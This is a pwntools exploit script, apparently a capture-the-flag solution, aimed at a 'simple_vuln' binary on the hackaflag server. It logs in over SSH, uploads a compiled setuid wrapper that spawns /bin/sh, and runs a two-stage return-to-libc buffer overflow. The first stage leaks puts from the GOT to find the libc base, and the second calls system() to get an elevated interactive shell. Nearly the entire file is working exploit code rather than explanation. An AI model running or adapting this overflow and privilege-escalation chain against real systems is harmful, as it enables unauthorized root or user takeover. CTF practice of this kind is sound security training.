from pwn import *
context.arch = "i386"
 
s = ssh(user="pwn0", host="pwn.hackaflag.com.br", port=22, password="pwn0ownar")
s.process(["/bin/rm", "-rf","/dev/shm/dummy"])
s.process(["/bin/rm", "-rf","/dev/shm/iconv"])
s.process(["/bin/mkdir", "/dev/shm/dummy"])
s.process(["/bin/mkdir", "/dev/shm/iconv"])
 
setuid_wrapper = ("""
#include <stdio.h>
int main(int argc, char *argv[])
{
     
    setuid(1001);
    seteuid(1001);
    setgid(1001);
    setegid(1001);
    system("/bin/sh");
}""")
 
f = open("f.c", "wb")
f.write(setuid_wrapper)
f.close()
os.system("gcc f.c -o skeleton -m32")
os.system("mv skeleton skeleton.c")
s.put("./skeleton.c", remote="/dev/shm/iconv/skeleton.c")
s.process(["/bin/chmod","4777","/dev/shm/iconv/skeleton.c"])
 
p = s.process(executable="/home/pwn0/simple_vuln", cwd="/dev/shm/dummy", setuid=True, aslr=True)
puts_plt = 0x8048440
puts_got = 0x804a01c
main = 0x8048681
success("puts_got: %#x", puts_got)
success("main: %#x", main)
payload1 = cyclic(104) 
payload1 += p32(puts_plt) 
payload1 += p32(main) 
payload1 += p32(puts_got)  
payload1 += p32(0)
 
p.recv()
p.sendline(payload1)
p.recvline()
leaked_puts = u32(p.recvline()[0:4]) #decimal
libc_puts = 0x0005f140
success("leaked_puts: %#x", leaked_puts) #hexadecimal
 
libc_base  = leaked_puts - libc_puts
success("libc_base: %#x", libc_base)
p.recv()
system = int(hex(libc_base + 0x0003a940),16)
binsh = int(hex(libc_base + 0x15902b),16)
skeleton = int(hex(libc_base + 0x158b15),16)
 
payload2 = cyclic(104)
payload2 += p32(system)
payload2 += "BBBB"
payload2 += p32(skeleton)
payload2 += p32(0)
 
print hexdump(payload2)
p.sendline(payload2)
print p.recv()
p.interactive()
